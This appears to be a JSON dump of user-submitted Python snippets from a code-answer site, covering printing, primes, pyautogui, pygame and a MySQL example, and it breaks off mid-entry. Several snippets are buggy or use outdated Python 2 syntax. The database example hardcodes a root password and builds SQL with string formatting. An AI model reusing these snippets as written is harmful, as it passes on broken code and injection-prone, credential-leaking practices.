    "description": "print(\"Hello World!\")\nprint('Hello. You have big PIPI')\n# This is a print statement print(\"Hello, world!\")\n# To print a string... print(\"I am a string yay\")  # To print an answer to an equation... print(5+5)  # To print the answer of previously defined variables... x = 50 n = 30 print(x + n)  # Notes: # You can't add a string to a number. x = \"foo\" n = 50 print(x + n) # That will come up with an error.\n#Normal:# print(\"Hiya Grepper!\") #Output: Hiya Grepper!# #As Equation:# print(1+1)  #Output: 2# #With String Variables:# x = 'Pog' print(x + 'Champ') #Output: PogChamp# #With Integer Variables:# y = 9999 z = str(y) print('You have ' + z + ' IQ') #Output: You have 9999 IQ# #NOTE: Not converting the int variable to a str variable will return an error#\nprint(\"type what you want to be printed\") \n# Rainy Day wet = 'umbrella' print(wet) # Sunny Day hot = 'sunglasses' print(hot)\nx = 10 y = 5 print(x)\t\t\t# 10 print(\"x is \",x)\t# x is 10 print(x,y)\t\t\t# 10 5 print(\"sum of\", x, \"and\", y, \"is\", x+y)   # sum of 10 and 5 is 15 mCar = \"A\" print(mCar * y) \t# AAAAA\nprint(\"Hello, World!\") #Output: Hello, World!  print(5+5) # Output:10  x=10 y=11 print(x+y) #Output: 21\nprint('Message')\n",
    "reg_date": "2021-10-12T11:33:50.000Z"
  },
  {
    "id": 3672,
    "keyword": null,
    "link": null,
    "title": " python print combinations of string",
    "description": "test_str = \"abc\" res = [test_str[i: j] for i in range(len(test_str))            for j in range(i + 1, len(test_str) + 1)] print(res)#['a', 'ab', 'abc', 'b', 'bc', 'c']\nimport itertools   if __name__ == '__main__':       nums = list(\"ABC\")     permutations = list(itertools.permutations(nums))       # Output: ['ABC', 'ACB', 'BAC', 'BCA', 'CAB', 'CBA']     print([''.join(permutation) for permutation in permutations])\n",
    "reg_date": "2021-10-12T11:33:51.000Z"
  },
  {
    "id": 3673,
    "keyword": null,
    "link": null,
    "title": " python print dict new line",
    "description": "print(\"{\" + \"\\n\".join(\"{!r}: {!r},\".format(k, v) for k, v in d.items()) + \"}\") \n",
    "reg_date": "2021-10-12T11:33:51.000Z"
  },
  {
    "id": 3674,
    "keyword": null,
    "link": null,
    "title": " python print dict pretty",
    "description": ">>> import json >>> print json.dumps({'a':2, 'b':{'x':3, 'y':{'t1': 4, 't2':5}}}, ...                  sort_keys=True, indent=4) {     \"a\": 2,     \"b\": {         \"x\": 3,         \"y\": {             \"t1\": 4,             \"t2\": 5         }     } } \nimport pprint  student_dict = {'Name': 'Tusar', 'Class': 'XII',       'Address': {'FLAT ':1308, 'BLOCK ':'A', 'LANE ':2, 'CITY ': 'HYD'}}  print student_dict print \"\\n\" print \"***With Pretty Print***\" print \"-----------------------\" pprint.pprint(student_dict,width=-1) \n",
    "reg_date": "2021-10-12T11:33:51.000Z"
  },
  {
    "id": 3675,
    "keyword": null,
    "link": null,
    "title": " python print error traceback",
    "description": "import traceback  try:     raise TypeError(\"Oups!\") except Exception, err:     try:         raise TypeError(\"Again !?!\")     except:         pass      traceback.print_exc()\n",
    "reg_date": "2021-10-12T11:33:51.000Z"
  },
  {
    "id": 3676,
    "keyword": null,
    "link": null,
    "title": " python print file",
    "description": "import sys  # only this print call will write in the file print(\"Hello Python!\", file=open('output.txt','a'))  # not this one (std output) print(\"Not written\")  # any further print will be done in the file sys.stdout = open('output.txt','wt') print(\"Hello Python!\")\nwith open('pagehead.section.htm','r') as f:     output = f.read()\n>>> with open('workfile') as f: ...     read_data = f.read()  >>> # We can check that the file has been automatically closed. >>> f.closed True \n#first arg is the name of the file #second arg notes that the file is open to write to it outputFile = open(\"fileName\", \"w\") #next line writes to the file outputFile.write(str) #remember to close opened files outputFile.close()\n",
    "reg_date": "2021-10-12T11:33:51.000Z"
  },
  {
    "id": 3677,
    "keyword": null,
    "link": null,
    "title": " python print float in scientific notation",
    "description": "v = 2.50435-e03 '%.2E' % v  # returns '2.50E-03'\n",
    "reg_date": "2021-10-12T11:33:52.000Z"
  },
  {
    "id": 3678,
    "keyword": null,
    "link": null,
    "title": " python print how long it takes to run",
    "description": "import time start_time = time.time()  #your program print (\"My program took\", time.time() - start_time, \"to run\") \n",
    "reg_date": "2021-10-12T11:33:52.000Z"
  },
  {
    "id": 3679,
    "keyword": null,
    "link": null,
    "title": " python print in color",
    "description": "def colored(r, g, b, text):     return \"\\033[38;2;{};{};{}m{} \\033[38;2;255;255;255m\".format(r, g, b, text)    text = 'Hello, World' colored_text = colored(255, 0, 0, text) print(colored_text)  #or  print(colored(255, 0, 0, 'Hello, World'))\nclass bcolors:     HEADER = '\\033[95m'     OKBLUE = '\\033[94m'     OKGREEN = '\\033[92m'     WARNING = '\\033[93m'     FAIL = '\\033[91m'     ENDC = '\\033[0m'     BOLD = '\\033[1m'     UNDERLINE = '\\033[4m'  print(f\"{bcolors.WARNING}Error : Test message !{bcolors.ENDC}\")\nclass bcolors:     HEADER = '\\033[95m'     OKBLUE = '\\033[94m'     OKCYAN = '\\033[96m'     OKGREEN = '\\033[92m'     WARNING = '\\033[93m'     FAIL = '\\033[91m'     ENDC = '\\033[0m'     BOLD = '\\033[1m'     UNDERLINE = '\\033[4m'  print(f\"{bcolors.WARNING}Warning: No active frommets remain. Continue?{bcolors.ENDC}\")\nfrom termcolor import colored print colored('hello', 'red'), colored('world', 'green')\n#pip install termcolor from termcolor import cprint  cprint('Hello, World! In yellow highlighted in red!', 'yellow', 'on_red') cprint('Hello, World! Underlined in red!', 'red', attrs=[\"underline\"])\n# Python program to print  # green text with red background   #pip install termcolor #pip install colorama    from colorama import init  from termcolor import colored     init()     print(colored('Hello, World!', 'green', 'on_red')) \n",
    "reg_date": "2021-10-12T11:33:52.000Z"
  },
  {
    "id": 3680,
    "keyword": null,
    "link": null,
    "title": " python print list with newline",
    "description": "my_list = [1, 2, 3, 4] print(*my_list, sep=\"\\n\")\n>>> l = [1, 2, 3] >>> print(' '.join(str(x) for x in l)) 1 2 3 >>> print(' '.join(map(str, l))) 1 2 3\nitems = [1,2,3,4,5,6]  #print with [] brackets separated by ',' print(items)  #print using operator print(*items)  #print using for  for i in items:     print(i)      #print using for and len function for i in range(len(items)):     print(items[i])  #you can also add sep and end methods to the print statement accordingly \nlist = ['a', 'b'] print(list[0]) #that will print 'a' #print(list[1]) will print 'b'\n>>> '{} {}'.format('Python', 'Format') 'Python Format'\nlist = ['a','b','c'] for i in list:   print(i, end=' ')\n",
    "reg_date": "2021-10-12T11:33:52.000Z"
  },
  {
    "id": 3681,
    "keyword": null,
    "link": null,
    "title": " python print object",
    "description": "print(dir(your_variable)) print(vars(your_variable)) \n>>> class Test: ...     def __repr__(self): ...         return \"Test()\" ...     def __str__(self): ...         return \"member of Test\" ...  >>> t = Test() >>> t Test() >>> print(t) member of Test\ndef (myObject):   print(vars(myObject))\n",
    "reg_date": "2021-10-12T11:33:52.000Z"
  },
  {
    "id": 3682,
    "keyword": null,
    "link": null,
    "title": " python print return code of requests",
    "description": ">>> import requests >>> r = requests.get('http://httpbin.org/status/404') >>> r.status_code 404\n__code-examples__python__python_print_return_code_of_requests__?\n>>> import requests >>> r = requests.get('http://httpbin.org/status/404') >>> r.status_code 404\n",
    "reg_date": "2021-10-12T11:33:52.000Z"
  },
  {
    "id": 3683,
    "keyword": null,
    "link": null,
    "title": " python print sta",
    "description": "print(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:33:52.000Z"
  },
  {
    "id": 3684,
    "keyword": null,
    "link": null,
    "title": " python print time",
    "description": "import datetime   currentDT = datetime.datetime.now() print(str(currentDT))  # prints XXXX-XX-XX XX:XX:XX.XXXXXX # or  import datetime   currentDT = datetime.datetime.now()   print (\"Current Year is: %d\" % currentDT.year) print (\"Current Month is: %d\" % currentDT.month) print (\"Current Day is: %d\" % currentDT.day) print (\"Current Hour is: %d\" % currentDT.hour) print (\"Current Minute is: %d\" % currentDT.minute) print (\"Current Second is: %d\" % currentDT.second) print (\"Current Microsecond is: %d\" % currentDT.microsecond) # prints \"\"\" Current Year is: XXXX Current Month is: XX Current Day is: XX Current Hour is: XX Current Minute is: XX Current Second is: XX Current Microsecond is: XXXXXX \"\"\"\nimport datetime now = datetime.datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\")) # key: https://strftime.org/\nimport datetime now = datetime.datetime.now() print (\"Current date and time : \") print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))  \n\"\"\"Imports the datetime package from the Python library\"\"\" from datetime import datetime  \"\"\"Sets the variable now to the current date and time\"\"\" now = datetime.now()  \"\"\"The variable current_time contains the string values of the current time\"\"\" current_time = now.strftime(\"%H:%M:%S\") print(\"Current Time =\", current_time)\n from datetime import datetime  now = datetime.now().time() # time object  print(\"now =\", now) print(\"type(now) =\", type(now))\t\n import time  t = time.localtime() current_time = time.strftime(\"%H:%M:%S\", t) print(current_time) \n",
    "reg_date": "2021-10-12T11:33:53.000Z"
  },
  {
    "id": 3685,
    "keyword": null,
    "link": null,
    "title": " python print time difference",
    "description": ">>> import datetime >>> a = datetime.datetime.now() >>> b = datetime.datetime.now() >>> c = b - a  >>> c datetime.timedelta(0, 4, 316543) >>> c.days 0 >>> c.seconds 4 >>> c.microseconds 316543\nfrom datetime import datetime import time  datetime1 = datetime.datetime.now() # Wait for 1 minute time.sleep(60)  datetime2 = datetime.datetime.now()  difference = datetime2 - datetime1 print(f\"The time difference between the 2 time is: {difference}\")\n",
    "reg_date": "2021-10-12T11:33:53.000Z"
  },
  {
    "id": 3686,
    "keyword": null,
    "link": null,
    "title": " python print timestamp",
    "description": "import datetime ts = datetime.datetime.now().timestamp()\nfrom datetime import datetime  timestamp = 1586507536367 dt_object = datetime.fromtimestamp(timestamp) \nimport time timestamp = 1547281745 datetime = time.strftime('%A, %Y-%m-%d %H:%M:%S', time.localtime(timestamp)) print(datetime)\nimport datetime from datetime import datetime timestamp = pd.Timestamp('2020-5-23')\nimport time  ts = time.time()  // OR import datetime;  ct = datetime.datetime.now()  ts = ct.timestamp() \n",
    "reg_date": "2021-10-12T11:33:53.000Z"
  },
  {
    "id": 3687,
    "keyword": null,
    "link": null,
    "title": " python print to file",
    "description": "file = open(\"text.txt\", \"w\")  file.write(\"Your text goes here\")  file.close()  'r' open for reading (default) 'w' open for writing, truncating the file first 'x' open for exclusive creation, failing if the file already exists 'a' open for writing, appending to the end of the file if it exists\nfile = open(&ldquo;testfile.txt&rdquo;,&rdquo;w&rdquo;)    file.write(&ldquo;Hello World&rdquo;)  file.write(&ldquo;This is our new text file&rdquo;)  file.write(&ldquo;and this is another line.&rdquo;)  file.write(&ldquo;Why? Because we can.&rdquo;)    file.close() \nimport sys  # only this print call will write in the file print(\"Hello Python!\", file=open('output.txt','a'))  # not this one (std output) print(\"Not written\")  # any further print will be done in the file sys.stdout = open('output.txt','wt') print(\"Hello Python!\")\nimport sys  print('This message will be displayed on the screen.')  original_stdout = sys.stdout # Save a reference to the original standard output  with open('filename.txt', 'w') as f:     sys.stdout = f # Change the standard output to the file we created.     print('This message will be written to a file.')     sys.stdout = original_stdout # Reset the standard output to its original value \nwith open(filename,\"w\") as f:   f.write('Hello World')\nwith open(\"file.txt\", \"w\") as file:   for line in [\"hello\", \"world\"]:     file.write(line)\n",
    "reg_date": "2021-10-12T11:33:53.000Z"
  },
  {
    "id": 3688,
    "keyword": null,
    "link": null,
    "title": " python print to terminal with color",
    "description": "def colored(r, g, b, text):     return \"\\033[38;2;{};{};{}m{} \\033[38;2;255;255;255m\".format(r, g, b, text)    text = 'Hello, World' colored_text = colored(255, 0, 0, text) print(colored_text)  #or  print(colored(255, 0, 0, 'Hello, World'))\nclass bcolors:     HEADER = '\\033[95m'     OKBLUE = '\\033[94m'     OKGREEN = '\\033[92m'     WARNING = '\\033[93m'     FAIL = '\\033[91m'     ENDC = '\\033[0m'     BOLD = '\\033[1m'     UNDERLINE = '\\033[4m'  print(f\"{bcolors.WARNING}Error : Test message !{bcolors.ENDC}\")\nfrom termcolor import colored print colored('hello', 'red'), colored('world', 'green')\n",
    "reg_date": "2021-10-12T11:33:53.000Z"
  },
  {
    "id": 3689,
    "keyword": null,
    "link": null,
    "title": " python print traceback from exception",
    "description": "import traceback  try:     do_stuff() except Exception as err:     print(err, traceback.format_exc()) \nimport traceback  try:     raise TypeError(\"Oups!\") except Exception, err:     try:         raise TypeError(\"Again !?!\")     except:         pass      traceback.print_exc()\nimport traceback  try: #Error prone code \tx=1/0 except Exception as e:   \tprint(e) \ttraceback.print_exc()\n",
    "reg_date": "2021-10-12T11:33:53.000Z"
  },
  {
    "id": 3690,
    "keyword": null,
    "link": null,
    "title": " python print unicode character",
    "description": "def str_to_unicode(s: str):     return s.encode(\"unicode_escape\").decode() print(str_to_unicode('Python is Great '))\n",
    "reg_date": "2021-10-12T11:33:53.000Z"
  },
  {
    "id": 3691,
    "keyword": null,
    "link": null,
    "title": " python print version",
    "description": "import sys print(sys.version)\nimport sys  print('Python version') print(sys.version) print('Version info.') print(sys.version_info)\nimport platform print(platform.python_version())\n",
    "reg_date": "2021-10-12T11:33:54.000Z"
  },
  {
    "id": 3692,
    "keyword": null,
    "link": null,
    "title": " python print without space",
    "description": "print(\"a\",8,sep = '')  #Output: a8\n>>> print(\"a\",\"b\",\"c\") a b c >>> print(\"a\",\"b\",\"c\",sep=\"\") abc\n",
    "reg_date": "2021-10-12T11:33:54.000Z"
  },
  {
    "id": 3693,
    "keyword": null,
    "link": null,
    "title": " python program to find first n prime numbers",
    "description": "n = int(input(\"Enter a number : \")) c = 2 while n!=0:   for i in range(2,c):     if c%i==0:       break   else:       print(c,end=\" \")       n-=1   c+=1  \n>>> def getprimes(x):\tprimes = []\t# Loop through 9999 possible prime numbers\tfor a in range(1, 10000):\t\t# Loop through every number it could divide by\t\tfor b in range(2, a):\t\t\t# Does b divide evenly into a ?\t\t\tif a % b == 0:\t\t\t\tbreak\t\t# Loop exited without breaking ? (It is prime)\t\telse:\t\t\t# Add the prime number to our list\t\t\tprimes.append(a)\t\t# We have enough to stop ?\t\tif len(primes) == x:\t\t\treturn primes\t\t>>> getprimes(5)[1, 2, 3, 5, 7]>>> getprimes(7)[1, 2, 3, 5, 7, 11, 13]\n",
    "reg_date": "2021-10-12T11:33:54.000Z"
  },
  {
    "id": 3694,
    "keyword": null,
    "link": null,
    "title": " python program to find n prime numbers",
    "description": "num = 10 for i in range(2,num+1):     for j in range(2,i):         if(i%j == 0):             break     else:         print(i)\nlower = int(input(\"Enter lower range: \"))   upper = int(input(\"Enter upper range: \"))      for num in range(lower,upper + 1):      if num > 1:          for i in range(2,num):              if (num % i) == 0:                  break          else:              print(num)  \n",
    "reg_date": "2021-10-12T11:33:54.000Z"
  },
  {
    "id": 3695,
    "keyword": null,
    "link": null,
    "title": " python program to give shop name",
    "description": "print(\"Welcome to the shop Name Generator.\") street = input(\"What's name of the city you grew up in?\\n\") pet = input(\"What's your pet's name?\\n\") print(\"Your shop name could be \" + street + \" \" + pet)\n",
    "reg_date": "2021-10-12T11:33:54.000Z"
  },
  {
    "id": 3696,
    "keyword": null,
    "link": null,
    "title": " python program to keep your computer awake",
    "description": "import time import mouse import random while True:     get_position_of_mouse = mouse.get_position()     time.sleep(10)     new_position = mouse.get_position()     go_to = random.randint(10,300)     if get_position_of_mouse == new_position:        mouse.move(go_to,go_to) #if you know how to check if the user is typing something but not using mouse you can  #add that feature also\n",
    "reg_date": "2021-10-12T11:33:54.000Z"
  },
  {
    "id": 3697,
    "keyword": null,
    "link": null,
    "title": " python program to multiplies all the items in a list using function",
    "description": "def list_number_multiplier(list_of_numbers):     result = 1     for item in list_of_numbers:         result = result * item     return result x = [2,5,8] print(list_number_multiplier(x))\nl = [1,2,3,4,5]  tot = 1 for x in l:   tot = tot * x    print(tot) >>> 120\n",
    "reg_date": "2021-10-12T11:33:54.000Z"
  },
  {
    "id": 3698,
    "keyword": null,
    "link": null,
    "title": " python program to print list vertically without using loop",
    "description": "lst = [1,2,3,4,5] print(*lst,end=\"\\n\")  #output 1 2 3 4 5\n# using * operator and sep = '\\n' scores = [11, 12, 13, 14, 15, 16] print(*scores, sep = '\\n')\n",
    "reg_date": "2021-10-12T11:33:54.000Z"
  },
  {
    "id": 3699,
    "keyword": null,
    "link": null,
    "title": " python program to print list without brackets",
    "description": "# you're using Python 3, or appropriate Python 2.x version with from __future__ import print_function then:  data = [7, 7, 7, 7] print(*data, sep='')\nlst = [1,2,3,4,5] print(*lst,end=\"\")  #output 1 2 3 4 5\n",
    "reg_date": "2021-10-12T11:33:54.000Z"
  },
  {
    "id": 3700,
    "keyword": null,
    "link": null,
    "title": " python programming gcse",
    "description": "Chapter 01 Worksheet             When writing answers to questions, please use proper grammar, capitalization,     and punctuation. Please limit the length of each line to 80 characters.        1. Write a line of code that will print your name.    2. How do you enter a comment in a program?    3. What do the following lines of code output?        ALSO: Why do they give a different answer?           print(2 / 3)     print(2 // 3)        4. Write a line of code that creates a variable called pi and sets        it to an appropriate value.    5. Why does this code not work?           A = 22     print(a)        6. All of the variable names below can be used. But which ONE of these is        the better variable name to use?           a     A     Area     AREA     area     area_of_rectangle     Area_Of_Rectangle        7. Which of these variables names are not allowed in Python? (More than one     might be wrong. Also, this question is not asking about improper names, just     names that aren't allowed. Test them if you aren't sure.)           apple     Apple     APPLE     Apple2     1Apple     account number     account_number     account.number     accountNumber     account#     pi     PI     fred     Fred     GreatBigVariable     greatBigVariable     great_big_variable     great.big.variable     2x     x2x     total%     #left        8. Why does this code not work?           print(a)     a = 45        9. Explain the mistake in this code:           pi = float(3.14)       10. This program runs, but the code still could be better. Explain what is     wrong with the code.           radius = float(input(\"Radius:\"))     x = 3.14     pi = x     area = pi  * radius ** 2     print(area)       11. Explain the mistake in the following code:           x = 4     y = 5     a = ((x) * (y))     print(a)       12. Explain the mistake in the following code:           x = 4     y = 5     a = 3(x + y)     print(a)       13. Explain the mistake in the following code:           radius = input(float(\"Enter the radius:\"))       14. Do all these print the same value? Which one is better to use and why?           print(2/3+4)     print(2 / 3 + 4)     print(   2 /    3+    4  )       15. What is a constant?   16. How are variable names for constants different than other variable names?   17. What is a single quote and what is a double quote?     Give and label an example of both.   18. Write a Python program that will use escape codes to print a double-quote     and a new line using the Window's standard. (Note: I'm asking for the Window's     standard here. Look it up out of Chapter 1.)   19. Can a Python program print text to the screen using single quotes instead     of double quotes?   20. Why does this code not calculate the average?           print(3 + 4 + 5 / 3)         21. What is an ``operator'' in Python?   22. What does the following program print out?           x = 3     x + 1     print(x)         23. Correct the following code:           user_name = input(\"Enter your name: )\"         24. Correct the following code:           value = int(input(print(\"Enter your age\"))) \n",
    "reg_date": "2021-10-12T11:33:55.000Z"
  },
  {
    "id": 3701,
    "keyword": null,
    "link": null,
    "title": " python project ideas",
    "description": "# I understand that this isn't Grepper's primary use but here are some  # fun little projects that I've found (self taught) to be really fun and # educational!  def beginner():   # Beginner Projects      beginner_proj =\"\"\"   Everyone has to start somewhere!      Understand functions with a simple math function   - Takes in an input, makes it an integer, multiplies it by 2, returns/prints result      Same string checker   - Takes in two strings and compares them. If they're the same, print(\"Same!\")      String character counter   - Takes in a string and outputs the length of the string   -- Bonus points if you can make it not count spaces!      Coinflipper   - Use Python's random module to select a random num between 0-1. If it's 0, it's tails else it's heads   -- Bonus points if you can take in a user input of heads/tails and compare that to   -- the flip, letting them know if they won or not      Test percentage calculator   - Take in test result and total test score then do simple maths to find the percentage   -- Bonus points if you can find out how to round the percentage      Number guessing game   - Generate number from 0-100 and ask the user to guess the number   -- Many bonus points if you can create a points system!      Make a random person picker for a party game   - Using Python's random module, choose a random person from a list of names   -- Bonus points if you make a menu at the beginning of the game   -- which allows users to add many names    \"\"\"   print(beginner_proj)     def intermediate():   # Intermediate Projects      intermediate_proj =\"\"\"   Well done, you're doing well!      Create a quadratic equation solver   - Sounds difficult but just google quadratic equation and take in the values a, b and c   - This will teach you about Python's math module      Make a benchmark   - Using pythons time module, start a timer on the first line, make the program do many complex   - calculations (e.g multiply all numbers from 0-1mil by 2) and when finished, stop the timer.   - print out the time taken      Make a morse code translator   - Test your knowledge of dictionaries with a dictionary that compares   - {\"letter\":\"more_code\"}. Then loop through an inputted string and convert it into morse      Make your first API call   - Using the Requests module, send a request to \"https://api.genderize.io/?name=your_name\"   - and by using formatted strings, replace your_name with an inputted name! Output the guessed gender.      Make an information generator   - Make a program that will generate a: name, email, address, tel num, height, ethnicity, eye colour etc.   -- Bonus points if you can store the generated person in a dictionary so that you can access information about   -- them at any time      Make a complete casino   - Coinflip, roulette, slots etc.   -- Bonus points if you can integrate a deposit money feature (Obviously fake money!)  \"\"\"      print(intermediate_proj)    def expert():   # Expert projects      expert_proj = \"\"\"   Ah, I see you're bored and want some ideas on what to do next      Create a Discord bot using discord.py   - The community is incredibly supportive and it's something that can be quite fun!   - Make a bot that can: ban, kick, warn, say anything, change nicknames etc.      Create your own PYPI package   - Making a python module is an impressive feat, why not try it out?   - Think it's too hard? I managed to make mine when I was just 16 and trust me, I just followed   - the official documentation line by line!      Make a text based game   - Include minigames and an interesting story      Make an edge detection algorithm   - This one is quite tough but I'm 17 and have managed so I'm sure you can too!   - An edge is detected by getting the average of the neighbouring pixels to a pixel   - and then finding the average of those pixels. Subtract that average from the current pixel.   -- For a solution visit my method (Definitely not the best way of doing it)   -- https://github.com/pTinosq/Edge-Detection-Algorithm      Make a noise reduction algorithm   - Also quite difficult but possible   - Noise is reduced in a very similar way but instead of subtracting the mean, you replace the    - current pixel with the mean you just calculated   -- Answer also available at https://github.com/pTinosq/Noise-Reduction-Algorithm      I know you won't particularly like this one but, try something new!   If you think you've mastered python well enough, try and expand your horizons.   Here are some languages you might consider:   Javascript, HTML/CSS, LUA, C#, Kotlin, Rust, GO, Swift      \"\"\"      print(expert_proj)     def final_notes():   thank_you = \"\"\"   Thanks for taking the time to read this, I hope it gave some of you some good ideas to work with!   If you're interested in seeing some of the projects being put to use, check out my Github   https://github.com/pTinosq where I will post most of my new projects (Unless they're private).      \"\"\"      print(thank_you)\npython projects (1)rock paper sissor (2)hang man (3)tic tac toe (4)password generator (5)number gussing game\n# Python rogram to find the SHA-1 message digest of a file  # importing the hashlib module import hashlib  def hash_file(filename):    \"\"\"\"This function returns the SHA-1 hash    of the file passed into it\"\"\"     # make a hash object    h = hashlib.sha1()     # open file for reading in binary mode    with open(filename,'rb') as file:         # loop till the end of the file        chunk = 0        while chunk != b'':            # read only 1024 bytes at a time            chunk = file.read(1024)            h.update(chunk)     # return the hex representation of digest    return h.hexdigest()  message = hash_file(\"track1.mp3\") print(message) \n",
    "reg_date": "2021-10-12T11:33:55.000Z"
  },
  {
    "id": 3702,
    "keyword": null,
    "link": null,
    "title": " python project with database connectivity",
    "description": "#APPARENTLY IT IS NOT POSSIBLE TO UPLOAD TOO LONG CODES HERE # AND MY PROJECT IS OVER 1800 LINES DISTRIBUTED OVER 3 FILES... SO # HERE ARE THE BASICS... HOPE YOU CAN BUILD UP YOUR OWN PROJECT USING THIS # THIS IS AN EXAMPLE JUST EXPLAINING THE BASICS OF DATABASE MANNAGEMENT IN PYTHON # HOPE YOU CAN BUILD UP FROM HERE import mysql.connector as MC try:     Con_o = MC.connect(host=\"localhost\",user=\"root\",passwd=\"sidspc12345\",database=\"mydb\")     if Con_o.is_connected():         print(\"Connection established successfully\") except Exception as E:     print(\"Connection Failed !\")     print(\"ERROR : \",e)  Cur = Con_o.cursor() Cur.execute(\"select * from  students where Percentage>= 95\")  data = Cur.fetchall()  for row in data:     print(row)  Con_o.commit() st = \"INSERT INTO students(Roll,Name,Sex,Stream,Phone,Address,Maths,Science,SST,English,Hindi) values({},'{}','{}','{}',{},'{}',{},{},{},{},{})\".format(11021,'Siddharth','M','S',7002744892,'Second link road Silchar',100,100,100,94,88) Cur.execute(st) Con_o.commit()  Cur.execute(\"select * from  students\")  data = Cur.fetchall()  for row in data:     print(row) Con_o.close() \n",
    "reg_date": "2021-10-12T11:33:55.000Z"
  },
  {
    "id": 3703,
    "keyword": null,
    "link": null,
    "title": " python protected attributes",
    "description": "class example:   def __init__(self):     self._variable1='protected variale'      self.__variable2='private variable'     self.variable3='public variable'\n",
    "reg_date": "2021-10-12T11:33:55.000Z"
  },
  {
    "id": 3704,
    "keyword": null,
    "link": null,
    "title": " python psycopg2 utf8",
    "description": "#Make sure you're using the right encodind by running: print conn.encoding  #and if you need, you can set the right encoding by conn.set_client_encoding('UNICODE') #or conn.set_client_encoding('UTF8').\n",
    "reg_date": "2021-10-12T11:33:55.000Z"
  },
  {
    "id": 3705,
    "keyword": null,
    "link": null,
    "title": " python punctuation",
    "description": "import string  print (string.punctuation)          # !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ sentence = \"Hey guys !, How are 'you' ?\" for i in sentence:     if i in string.punctuation:         print(i)  \t \t\t\t\t# ! , ' ' ?\nSyntax : string.punctuation Parameters : Doesn&rsquo;t take any parameter, since it&rsquo;s not a function. Returns : Return all sets of punctuation. CASE: 1   # import string library function   import string   # Storing the sets of punctuation in variable result   result = string.punctuation   # Printing the punctuation values   print(result)  #OUTPUT : !\"#$%&'()*+, -./:;<=>?@[\\]^_`{|}~  CASE: 2 # import string library function   import string        # An input string.  sentence = \"Hey, Geeks !, How are you?\" for i in sentence:        # checking whether the char is punctuation.      if i in string.punctuation:          # Printing the punctuation values           print(\"Punctuation: \" + i)      # Output:  # Punctuation:, # Punctuation: ! # Punctuation:, # Punctuation: ? \n",
    "reg_date": "2021-10-12T11:33:55.000Z"
  },
  {
    "id": 3706,
    "keyword": null,
    "link": null,
    "title": " python pyautogui",
    "description": "pip3 install pyautogui\n    >>> import pyautogui     >>> screenWidth, screenHeight = pyautogui.size() # Returns two integers, the width and height of the screen. (The primary monitor, in multi-monitor setups.)     >>> currentMouseX, currentMouseY = pyautogui.position() # Returns two integers, the x and y of the mouse cursor's current position.     >>> pyautogui.moveTo(100, 150) # Move the mouse to the x, y coordinates 100, 150.     >>> pyautogui.click() # Click the mouse at its current location.     >>> pyautogui.click(200, 220) # Click the mouse at the x, y coordinates 200, 220.     >>> pyautogui.move(None, 10)  # Move mouse 10 pixels down, that is, move the mouse relative to its current position.     >>> pyautogui.doubleClick() # Double click the mouse at the     >>> pyautogui.moveTo(500, 500, duration=2, tween=pyautogui.easeInOutQuad) # Use tweening/easing function to move mouse over 2 seconds.     >>> pyautogui.write('Hello world!', interval=0.25)  # Type with quarter-second pause in between each key.     >>> pyautogui.press('esc') # Simulate pressing the Escape key.     >>> pyautogui.keyDown('shift')     >>> pyautogui.write(['left', 'left', 'left', 'left', 'left', 'left'])     >>> pyautogui.keyUp('shift')     >>> pyautogui.hotkey('ctrl', 'c') \npip3 install pyautogui  import pyautogui screenWidth, screenHeight = pyautogui.size() # Get the size of the primary monitor. currentMouseX, currentMouseY = pyautogui.position() # Get the XY position of the mouse. pyautogui.moveTo(100, 150) # Move the mouse to XY coordinates. pyautogui.moveTo(500, 500, duration=2, tween=pyautogui.easeInOutQuad)  # Use tweening/easing function to move mouse over 2 seconds. pyautogui.move(0, 10)      # Move mouse 10 pixels down from its current position.  pyautogui.click()          # Click the mouse. pyautogui.click(100, 200)  # Move the mouse to XY coordinates and click it. pyautogui.click('button.png') # Find where button.png appears on the screen and click it. pyautogui.doubleClick()    # Double click the mouse.  pyautogui.write('Hello world!', interval=0.25)  # type with quarter-second pause in between each key pyautogui.press('esc')     # Press the Esc key. All key names are in pyautogui.KEY_NAMES pyautogui.keyDown('shift') # Press the Shift key down and hold it. pyautogui.press(['left', 'left', 'left', 'left']) # Press the left arrow key 4 times. pyautogui.keyUp('shift')   # Let go of the Shift key. pyautogui.hotkey('ctrl', 'c') # Press the Ctrl-C hotkey combination.  pyautogui.alert('This is the message to display.') # Make an alert box appear and pause the program until OK is clicked.\n>>> pyautogui.press('enter')  # press the Enter key >>> pyautogui.press('f1')     # press the F1 key >>> pyautogui.press('left')   # press the left arrow key \n",
    "reg_date": "2021-10-12T11:33:55.000Z"
  },
  {
    "id": 3707,
    "keyword": null,
    "link": null,
    "title": " python pygame",
    "description": " 1 # Simple pygame program  2   3 # Import and initialize the pygame library  4 import pygame  5 pygame.init()  6   7 # Set up the drawing window  8 screen = pygame.display.set_mode([500, 500])  9  10 # Run until the user asks to quit 11 running = True 12 while running: 13  14     # Did the user click the window close button? 15     for event in pygame.event.get(): 16         if event.type == pygame.QUIT: 17             running = False 18  19     # Fill the background with white 20     screen.fill((255, 255, 255)) 21  22     # Draw a solid blue circle in the center 23     pygame.draw.circle(screen, (0, 0, 255), (250, 250), 75) 24  25     # Flip the display 26     pygame.display.flip() 27  28 # Done! Time to quit. 29 pygame.quit() \n# Be sure to install pygame via pip  import pygame import sys  # initialize it pygame.init()  # configurations frames_per_second = 30 window_height = 600 window_width = 400  # colors WHITE = (255, 255, 255) BLACK = (0, 0, 0) BLUE = (0, 0, 255)  # creating window display = pygame.display.set_mode((window_width, window_height))  # creating our frame regulator clock = pygame.time.Clock()  # forever loop while True:   # frame clock ticking   clock.tick(frames_per_second)      # frame Drawing   display.fill(WHITE)      # event loop   for event in pygame.event.get():     if event.type == pygame.QUIT:       pygame.quit()       sys.exit()       \n# Pygame boiler plate # Should have a red square on screen if run # pip3 install pygame  import pygame  screen = pygame.display.set_mode((1280, 720))  running = True while running: \tscreen.fill((0, 0, 0))    \tfor event in pygame.event.get(): \t\tif event.type == pygame.QUIT: \t\t\trunning = False  \tpygame.draw.rect(screen, (255, 0, 0), ((10, 10), (50, 50)))              \tpygame.display.update()      pygame.quit() \t\nimport sys import pygame  pygame.init()      screen = pygame.display.set_mode((800, 400)) pygame.display.set_caption('Amogus Adventures') clock = pygame.time.Clock()  test_font = pygame.font.Font('Graphics/Pixeltype.ttf', 50) StartButton = pygame.image.load('Graphics/STARTAS.png') GameStart = 